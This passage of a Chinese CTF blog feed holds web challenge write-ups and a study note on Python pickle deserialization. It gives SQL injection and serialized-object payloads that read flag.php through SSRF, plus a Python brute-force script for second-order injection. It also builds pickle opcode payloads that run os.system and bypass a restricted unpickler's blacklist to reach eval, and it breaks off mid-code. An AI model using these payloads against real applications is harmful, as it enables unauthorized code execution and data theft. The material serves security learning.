class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;get(<span class="hljs-keyword">$this</span>-&gt;blog);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">isValidBlog</span> (<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$blog</span> = <span class="hljs-keyword">$this</span>-&gt;blog;<br>        <span class="hljs-keyword">return</span> preg_match(<span class="hljs-string">&quot;/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i&quot;</span>, <span class="hljs-variable">$blog</span>);<br>    &#125;<br><br>&#125;<br></code></pre></div></td></tr></table></figure><p>很明显data的数据就是这个<code>UserInfo</code>类，内容就是我们之前注册用户的数据，然后这里需要联想一下，,因为源码里面很明显要SSRF打内网，这里又需要序列化，结合报错消息<code>**Notice**: unserialize(): Error at offset 0 of 1 bytes in **/var/www/html/view.php** on line **31**</code>想到的就是可以用select查询我们构造的data数据，去执行<code>getBlogContents ()</code>来达到SSRF。构造<code>O:8:&quot;UserInfo&quot;:3&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:3:&quot;age&quot;;i:233;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;&#125;</code></p><figure class="highlight plain"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mysql">no&#x3D;-1 union&#x2F;**&#x2F;select  1,2,3,&#39;O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:3:&quot;age&quot;;i:23;s:4:&quot;blog&quot;;s:29:&quot;file:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php&quot;;&#125;&#39;<br><br>拿到flag<br>&lt;iframe width&#x3D;&#39;100%&#39; height&#x3D;&#39;10em&#39; src&#x3D;&#39;data:text&#x2F;html;base64,PD9waHANCg0KJGZsYWcgPSAiZmxhZ3sxZmE2ZDUzOS0xZTUyLTQyZjctYTk4NS1mMDZhOTU1NWQ0MmR9IjsNCmV4aXQoMCk7DQo&#x3D;&#39;&gt;<br></code></pre></div></td></tr></table></figure><h1 id="Unfinish"><a href="#Unfinish" class="headerlink" title="Unfinish"></a>Unfinish</h1><p>进入界面是一个登录，也没有给注册按钮，那就先扫目录吧，果然扫出来了个<code>register.php</code>，注册界面是需要邮箱，用户名，密码，但登录界面只需要用邮箱和密码，登录进去后回显出来了用户名，似乎又是二次注入。</p><p>测试了一下，发现过滤掉了<code>, information</code>等，那left，right函数就用不了了，这里有两个思路，一个是使用hex二次编码，二次编码后的长度太长了，再用<code>from for</code>截取来爆破出想要得到的结果，转码就行了。另个一使用ascii加上</p><p>测试pyload<code>0&#39;+ascii(substr(databases()) from 1 for 1)+&#39;0;</code></p><p>0’+ascii(substr((select * from flag) from {} for 1))+’0;</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> string<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> re<br>url = <span class="hljs-string">&#x27;http://5a23b673-9495-4dec-b80c-5cf3bf553d2f.node4.buuoj.cn:81/&#x27;</span><br>s = string.ascii_letters+string.ascii_uppercase+string.digits<br>ses = requests.session()<br>repatter = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">&#x27;&lt;span class=&quot;user-name&quot;&gt;[\s]+([\w]+)[\s]+&lt;&#x27;</span>)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">exp</span>():</span><br>    result = <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">100</span>):<br>        time.sleep(<span class="hljs-number">0.5</span>)<br>        resister_url = url + <span class="hljs-string">&#x27;register.php&#x27;</span><br>        <span class="hljs-comment"># payload = &quot;0&#x27;+ascii(substr((select database()) from &#123;&#125; for 1))+&#x27;0;&quot;.format(i)       #数据库为web</span><br>        payload = <span class="hljs-string">&quot;0&#x27;+ascii(substr((select * from flag) from &#123;&#125; for 1))+&#x27;0;&quot;</span>.<span class="hljs-built_in">format</span>(i)<br>        resister_res = requests.post(resister_url,data=&#123;<span class="hljs-string">&#x27;email&#x27;</span>:<span class="hljs-string">&#x27;123&#123;&#125;@qq.com&#x27;</span>.<span class="hljs-built_in">format</span>(i),<br>                                                        <span class="hljs-string">&#x27;username&#x27;</span>:payload,<br>                                                        <span class="hljs-string">&#x27;password&#x27;</span>:<span class="hljs-string">&#x27;123&#x27;</span>&#125;).text<br>        <span class="hljs-comment"># print(resister_res)</span><br>        login_url = url + <span class="hljs-string">&#x27;login.php&#x27;</span><br>        loginres = requests.post(login_url,data=&#123;<span class="hljs-string">&#x27;email&#x27;</span>:<span class="hljs-string">&#x27;123&#123;&#125;@qq.com&#x27;</span>.<span class="hljs-built_in">format</span>(i),<br>                                                  <span class="hljs-string">&#x27;password&#x27;</span>:<span class="hljs-string">&#x27;123&#x27;</span>&#125;).text<br>        content = re.findall(repatter,loginres)<br>        result += <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(content[<span class="hljs-number">0</span>]))<br>        <span class="hljs-built_in">print</span>(result)  <span class="hljs-comment">#flag&#123;e3fd3970-c860-4e90-b4ed-189491a9047f&#125;</span><br>exp()<br><br>另一种用<span class="hljs-number">0</span><span class="hljs-string">&#x27;+(select substr(hex(hex((&#123;0&#125;))) from &#123;1&#125; for 10))+&#x27;</span><span class="hljs-number">0</span> 原理也是差不多的<br></code></pre></div></td></tr></table></figure><p>总结一下，这几个题大都考的是注入，穿插了一下其他的考点像序列化然后ssrf，再次熟悉了二次注入的原理及可能出现的地方，不得不说这几个题目还不错。</p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>pickle学习</title>
    <link href="/2021/08/11/2021-8-10-pickle%E9%A2%98%E7%9B%AE%E8%AE%B0%E5%BD%95/"/>
    <url>/2021/08/11/2021-8-10-pickle%E9%A2%98%E7%9B%AE%E8%AE%B0%E5%BD%95/</url>
    
    <content type="html"><![CDATA[<h1 id="Pickle"><a href="#Pickle" class="headerlink" title="Pickle"></a>Pickle</h1><p>关于<code>pickle</code>的知识</p><p>参考：<a href="https://www.freebuf.com/articles/web/264363.html">https://www.freebuf.com/articles/web/264363.html</a></p><p>​            <a href="https://zhuanlan.zhihu.com/p/361349643">https://zhuanlan.zhihu.com/p/361349643</a></p><p>​            <a href="https://www.freebuf.com/articles/web/252189.html">https://www.freebuf.com/articles/web/252189.html</a></p><p>pickle是python语言的一个标准模块，实现了基本的数据序列化和反序列化。<br>pickle模块是以二进制的形式序列化后保存到文件中（保存文件的后缀为<code>.pkl</code>），不能直接打开进行预览。</p><p><code>pickle.dumps</code>将对象反序列化为字符串，<code>pickle.dump</code>将反序列化后的字符串存储为文件。</p><p><code>pickle.loads() </code>对象反序列化 <code>pickle.load()</code> 对象反序列化，从文件中读取数据。</p><blockquote><p>#序列化 pickle.dump(obj, file, protocol=None,) obj表示要进行封装的对象(必填参数） file表示obj要写入的文件对象 以二进制可写模式打开即wb(必填参数） </p><p>#反序列化 pickle.load(file, *, fix_imports=True, encoding=”ASCII”, errors=”strict”, buffers=None) file文件中读取封存后的对象 以二进制可读模式打开即rb(必填参数)</p></blockquote><blockquote><p>#序列化 pickle.dumps(obj, protocol=None,*,fix_imports=True) dumps()方法不需要写入文件中，直接返回一个序列化的bytes对象。</p><p>#反序列化 pickle.loads(bytes_object, *,fix_imports=True, encoding=”ASCII”. errors=”strict”) loads()方法是直接从bytes对象中读取序列化的信息，而非从文件中读取。</p></blockquote><p>简单看一下序列化后结果，用的是<code>pickle0版本</code>看的更清楚一点。</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: gbk -*-</span><br><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> subprocess<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span>:</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self,a,b</span>):</span><br>        self.a = a<br>        self.b = b<br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    demo = Test(<span class="hljs-string">&#x27;KK&#x27;</span>,<span class="hljs-string">&#x27;fine&#x27;</span>)<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;test.pkl&#x27;</span>,<span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>        pickle.dump(demo,f,protocol=<span class="hljs-number">0</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\n&quot;</span>)<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;test.pkl&#x27;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>        <span class="hljs-built_in">print</span>(pickle.load(f))<br><br></code></pre></div></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/7e76970ea22942ee8ff360af46d7e185.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>指令集的介绍，具体和PVM有关。先可看看这张图，每个<code>protocol</code>版本不一样的话，序列化出来的结果是不一样的。</p><ol><li><code>c</code>：引入模块和对象，模块名和对象名以换行符分割。（<code>find_class</code>校验就在这一步，也就是说，只要c这个OPCODE的参数没有被<code>find_class</code>限制，其他地方获取的对象就不会被沙盒影响了，这也是我为什么要用getattr来获取对象）</li><li><code>(</code>：压入一个标志到栈中，表示元组的开始位置</li><li><code>t</code>：从栈顶开始，找到最上面的一个<code>(</code>，并将<code>(</code>到<code>t</code>中间的内容全部弹出，组成一个元组，再把这个元组压入栈中</li><li><code>R</code>：从栈顶弹出一个可执行对象和一个元组，元组作为函数的参数列表执行，并将返回值压入栈上</li><li><code>p</code>：将栈顶的元素存储到memo中，p后面跟一个数字，就是表示这个元素在memo中的索引</li><li><code>V</code>、<code>S</code>：向栈顶压入一个（unicode）字符串</li><li><code>.</code>：表示整个程序结束</li></ol><p><img src="https://image.3001.net/images/20201016/1602833405_5f894bfd4cd7bd1a9ecc0.png!small?1602833407394" alt="img"></p><h2 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h2><p>反序列化漏洞出现在 <code>__reduce__()</code>魔法函数上，这一点和PHP中的<code>__wakeup()</code>魔术方法类似，都是因为每当反序列化过程开始或者结束时 , 都会自动调用这类函数。而这恰好是反序列化漏洞经常出现的地方。</p><p>而且在反序列化过程中，因为编程语言需要根据反序列化字符串去解析出自己独特的语言数据结构，所以就必须要在内部把解析出来的结构去执行一下。如果在反序列化过程中出现问题，便可能直接造成RCE漏洞.</p><p>另外<code>pickle.loads</code>会解决<code>import</code>问题，对于未引入的<code>module</code>会自动尝试<code>import</code>。那么也就是说整个python标准库的代码执行、命令执行函数都可以进行使用。这里贴一下官方文档把，这个函数还挺常见的。</p><p><img src="https://img-blog.csdnimg.cn/b2aba418804f4b98ab539abf1bfae53d.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>当 <code>__reduce__()</code>函数返回一个元组时 , <strong>第一个元素</strong>是一个可调用对象 , 这个对象会在创建对象时被调用 . <strong>第二个元素</strong>是可调用对象的参数 , 同样是一个元组。这点跟PVM中的<code>R</code>操作码功能相似，可以对比下：</p><figure class="highlight plain"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs plain">将之前压入栈中的元组和可调用对象全部弹出 , 然后将该元组作为可调用参数的对象并执行该对象 。最后将结果压入到栈中 <br></code></pre></div></td></tr></table></figure><p>事实上 , <code>R</code>操作码就是 <code>__reduce__()</code>魔术函数的底层实现 . 而在反序列化过程结束的时候 , Python 进程会自动调用 <code>__reduce__()</code>魔术方法 . 如果可以控制被调用函数的参数 , Python 进程就可以执行恶意代码 .</p><h1 id="opcode进阶"><a href="#opcode进阶" class="headerlink" title="opcode进阶"></a>opcode进阶</h1><p>直接看好文<a href="https://xz.aliyun.com/t/7436#toc-5">https://xz.aliyun.com/t/7436#toc-5</a></p><p>​                    <a href="https://misakikata.github.io/2020/04/python-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96">https://misakikata.github.io/2020/04/python-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96</a></p><p>​                    <a href="https://www.jianshu.com/p/8fd3de5b4843">https://www.jianshu.com/p/8fd3de5b4843</a></p><p>​                    <a href="https://dar1in9s.github.io/2020/03/20/python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/#%E8%8A%B1%E5%BC%8Fimport">https://dar1in9s.github.io/2020/03/20/python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/#%E8%8A%B1%E5%BC%8Fimport</a></p><p>​                    <a href="https://www.leavesongs.com/PENETRATION/code-breaking-2018-python-sandbox.html">https://www.leavesongs.com/PENETRATION/code-breaking-2018-python-sandbox.html</a></p><p>沙箱逃逸    <a href="https://xz.aliyun.com/t/52#toc-6">https://xz.aliyun.com/t/52#toc-6</a></p><h4 id="opcode版本"><a href="#opcode版本" class="headerlink" title="opcode版本"></a>opcode版本</h4><p>pickle由于有不同的实现版本，在py3和py2中得到的opcode不相同。但是pickle可以向下兼容（所以用v0就可以在所有版本中执行）。目前，pickle有6种版本。测试一下</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><br>a=&#123;<span class="hljs-string">&#x27;1&#x27;</span>: <span class="hljs-string">&#x27;KKfine&#x27;</span>&#125;<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;# 原变量：<span class="hljs-subst">&#123;a&#125;</span>&#x27;</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">6</span>):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;pickle版本<span class="hljs-subst">&#123;i&#125;</span>&#x27;</span>,pickle.dumps(a,protocol=i))<br><br><span class="hljs-comment"># 输出：</span><br><span class="hljs-comment"># 原变量：&#123;&#x27;1&#x27;: &#x27;KKfine&#x27;&#125;</span><br>pickle版本<span class="hljs-number">0</span> <span class="hljs-string">b&#x27;(dp0\nV1\np1\nVKKfine\np2\ns.&#x27;</span><br>pickle版本<span class="hljs-number">1</span> <span class="hljs-string">b&#x27;&#125;q\x00X\x01\x00\x00\x001q\x01X\x06\x00\x00\x00KKfineq\x02s.&#x27;</span><br>pickle版本<span class="hljs-number">2</span> <span class="hljs-string">b&#x27;\x80\x02&#125;q\x00X\x01\x00\x00\x001q\x01X\x06\x00\x00\x00KKfineq\x02s.&#x27;</span><br>pickle版本<span class="hljs-number">3</span> <span class="hljs-string">b&#x27;\x80\x03&#125;q\x00X\x01\x00\x00\x001q\x01X\x06\x00\x00\x00KKfineq\x02s.&#x27;</span><br>pickle版本<span class="hljs-number">4</span> <span class="hljs-string">b&#x27;\x80\x04\x95\x11\x00\x00\x00\x00\x00\x00\x00&#125;\x94\x8c\x011\x94\x8c\x06KKfine\x94s.&#x27;</span><br>pickle版本<span class="hljs-number">5</span> <span class="hljs-string">b&#x27;\x80\x05\x95\x11\x00\x00\x00\x00\x00\x00\x00&#125;\x94\x8c\x011\x94\x8c\x06KKfine\x94s.&#x27;</span><br><br><br><span class="hljs-comment">#对于pickle版本3 ：</span><br><span class="hljs-comment"># \x80：协议头声明 \x03：协议版本</span><br><span class="hljs-comment"># \x06\x00\x00\x00：数据长度：6</span><br><span class="hljs-comment"># KKfine：数据</span><br><span class="hljs-comment"># q：储存栈顶的字符串长度：一个字节（即\x00）</span><br><span class="hljs-comment"># \x00：栈顶位置</span><br><span class="hljs-comment"># .：数据截止</span><br></code></pre></div></td></tr></table></figure><p>但是十六进制不太好观察时如何序列化的，可以使用pickletools可以方便的将opcode转化为便于肉眼读取的形式。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20200428142817753.png" alt="image-20200428142817753"></p><p>拿个例子看一下</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickletools<br><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> os<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">exp</span>(<span class="hljs-params"><span class="hljs-built_in">object</span></span>):</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__reduce__</span>(<span class="hljs-params">self</span>):</span><br>        <span class="hljs-keyword">return</span> (os.system,(<span class="hljs-string">&#x27;whoami&#x27;</span>,))<br>e = exp()<br>s = pickle.dumps(e,protocol=<span class="hljs-number">2</span>)  <span class="hljs-comment">#python3.8默认是版本4，会将操作符换成十六进制</span><br>pickletools.dis(s)<br><br><br>    <span class="hljs-number">0</span>: \x80 PROTO      <span class="hljs-number">2</span><span class="hljs-comment">#协议版本 </span><br>    <span class="hljs-number">2</span>: c    GLOBAL     <span class="hljs-string">&#x27;nt system&#x27;</span><span class="hljs-comment">#将&#x27;nt system&#x27;压入栈中       os.system</span><br>   <span class="hljs-number">13</span>: q    BINPUT     <span class="hljs-number">0</span><span class="hljs-comment">#把对象存储到memo的第0个位置</span><br>   <span class="hljs-number">15</span>: X    BINUNICODE <span class="hljs-string">&#x27;whoami&#x27;</span><span class="hljs-comment">#压入一个utf-8的元素参数   &#x27;whoami&#x27;</span><br>   <span class="hljs-number">26</span>: q    BINPUT     <span class="hljs-number">1</span><span class="hljs-comment">#存储到memo的第1个位置</span><br>   <span class="hljs-number">28</span>: \x85 TUPLE1<span class="hljs-comment">#将前面的元素参数弹出，组成元组再压栈，类比于命令&#x27;t&#x27;     (&#x27;whoami&#x27;,)</span><br>   <span class="hljs-number">29</span>: q    BINPUT     <span class="hljs-number">2</span><span class="hljs-comment">#将上面的元组存储到memo的第2个位置           ...</span><br>   <span class="hljs-number">31</span>: R    REDUCE<span class="hljs-comment">#将对象和元组组合执行，结果压栈          os.system(&#x27;whoami&#x27;)</span><br>   <span class="hljs-number">32</span>: q    BINPUT     <span class="hljs-number">3</span><span class="hljs-comment">#存储到memo的第3个位置上                    ...</span><br>   <span class="hljs-number">34</span>: .    STOP<span class="hljs-comment">#结束</span><br>highest protocol among opcodes = <span class="hljs-number">2</span><br><br>Process finished <span class="hljs-keyword">with</span> exit code <span class="hljs-number">0</span><br><br><br>用protocol=<span class="hljs-number">0</span>输出为<br>cnt<br>system<br>p0<br>(Vwhoami<br>p1<br>tp2<br>Rp3<br>.<br></code></pre></div></td></tr></table></figure><p>了解这些是为了便于下面尝试手动构造<code>opcode</code>，因为有时候会禁止使用某些模块或者命令执行函数时，需要自己构造来进行绕过。例如当源码如下时：</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> io<br><span class="hljs-keyword">import</span> builtins<br><br>__all__ = (<span class="hljs-string">&#x27;PickleSerializer&#x27;</span>, )<br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">RestrictedUnpickler</span>(<span class="hljs-params">pickle.Unpickler</span>):</span><br>    blacklist = &#123;<span class="hljs-string">&#x27;eval&#x27;</span>, <span class="hljs-string">&#x27;exec&#x27;</span>, <span class="hljs-string">&#x27;execfile&#x27;</span>, <span class="hljs-string">&#x27;compile&#x27;</span>, <span class="hljs-string">&#x27;open&#x27;</span>, <span class="hljs-string">&#x27;input&#x27;</span>, <span class="hljs-string">&#x27;__import__&#x27;</span>, <span class="hljs-string">&#x27;exit&#x27;</span>&#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">find_class</span>(<span class="hljs-params">self, module, name</span>):</span><br>        <span class="hljs-comment"># Only allow safe classes from builtins.</span><br>        <span class="hljs-keyword">if</span> module == <span class="hljs-string">&quot;builtins&quot;</span> <span class="hljs-keyword">and</span> name <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> self.blacklist:<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">getattr</span>(builtins, name)<br>        <span class="hljs-comment"># Forbid everything else.</span><br>        <span class="hljs-keyword">raise</span> pickle.UnpicklingError(<span class="hljs-string">&quot;global &#x27;%s.%s&#x27; is forbidden&quot;</span> %<br>                                     (module, name))<br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">PickleSerializer</span>():</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">dumps</span>(<span class="hljs-params">self, obj</span>):</span><br>        <span class="hljs-keyword">return</span> pickle.dumps(obj)<br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">loads</span>(<span class="hljs-params">self, data</span>):</span><br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(data, <span class="hljs-built_in">str</span>):<br>                <span class="hljs-keyword">raise</span> TypeError(<span class="hljs-string">&quot;Can&#x27;t load pickle from unicode string&quot;</span>)<br>            file = io.BytesIO(data)<br>            <span class="hljs-keyword">return</span> RestrictedUnpickler(file,<br>                              encoding=<span class="hljs-string">&#x27;ASCII&#x27;</span>, errors=<span class="hljs-string">&#x27;strict&#x27;</span>).load()<br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-keyword">return</span> &#123;&#125;<br></code></pre></div></td></tr></table></figure><p>用<code>RestrictedUnpickler</code>类设置了一个白名单，判断<code>module == &quot;builtins&quot;</code>限制了必须为<code>builtins</code>，这其实也是官方给出的防御方法之一，这里限制了模块引用，危险函数也无法直接用了，但可以用<code>getattr</code>来构造opcode.</p><p>从显示上看，明显是0版本更为好构造，既然如此，就用0版本来手写一个。</p><p>这里先尝试构造一个<code>builtins.getattr(builtins, &#39;eval&#39;),(&#39;__import__(&quot;os&quot;).system(&quot;whoami&quot;)&#39;,)</code>。</p><p>首先得确保引入了<code>builtins</code>模块，又无法直接压入单一对象，也就是需要从某个模块中调用到<code>builtins</code>。例如<code>builtins.__dict__.get(&#39;globals&#39;)().get(&#39;__builtins__&#39;)</code>或者<code>builtins.globals().get(&#39;builtins&#39;)</code></p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickletools<br><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span>  builtins<br><span class="hljs-comment">#builtins.getattr(builtins, &#x27;eval&#x27;),(&#x27;__import__(&quot;os&quot;).system(&quot;whoami&quot;)&#x27;,).</span><br><span class="hljs-comment">#builtins.__dict__.get(globals)().get(&#x27;builtins&#x27;)</span><br><span class="hljs-comment">#builtins.getattr(builtins.__dict__,&#x27;get&#x27;)(&#x27;globals&#x27;)().get(&#x27;__builtins__&#x27;)</span><br>test = <span class="hljs-string">b&quot;&quot;&quot;cbuiltins</span><br><span class="hljs-string">getattr</span><br><span class="hljs-string">(cbuiltins</span><br><span class="hljs-string">dict</span><br><span class="hljs-string">S&#x27;get&#x27;</span><br><span class="hljs-string">tR(cbuiltins</span><br><span class="hljs-string">globals</span><br><span class="hljs-string">(tRS&#x27;builtins&#x27;</span><br><span class="hljs-string">tR.</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>data = pickle.loads(test)<br><span class="hljs-built_in">print</span>(data)<br></code></pre></div></td></tr></table></figure><p>这里理解得时候要注意R操作符没执行一次都要返回一个操作结果，最开始的``builtins.getattr(dict, ‘get’)<code>比较容易理解，后面</code>(t<code>这里是压入空元组，其实也可以用</code>)<code>直接压入空元组，然后接一个</code>R<code>就返回了</code>globals<code>全局字典，最后压入一个字符串</code>builtins<code>来获取这个模块。下面就可以拼接</code>eval`命令了。</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">test = <span class="hljs-string">b&quot;&quot;&quot;cbuiltins</span><br><span class="hljs-string">getattr</span><br><span 